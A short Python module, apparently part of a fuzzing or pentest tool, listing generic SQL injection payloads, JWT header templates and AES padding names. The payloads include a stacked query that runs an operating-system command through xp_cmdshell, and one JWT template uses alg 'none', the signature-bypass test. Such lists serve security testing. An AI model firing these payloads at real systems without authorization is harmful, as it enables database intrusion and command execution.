"""
Payloads genéricos e padrões para fuzzing e SQLi automatizada.
"""

SQL_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' AND '1'='1",
    "'; EXEC xp_cmdshell('dir');--"
]

JWT_TEMPLATES = [
    {
        "alg": "HS256",
        "typ": "JWT"
    },
    {
        "alg": "RS256",
        "typ": "JWT"
    },
    {
        "alg": "ES256",
        "typ": "JWT"
    },
    {
        "alg": "PS256",
        "typ": "JWT"
    },
    {
        "alg": "none",
        "typ": "JWT"
    }
]

AES_KNOWN_PADS = [
    "PKCS7", "PKCS5", "ISO10126", "ZeroPadding"
]
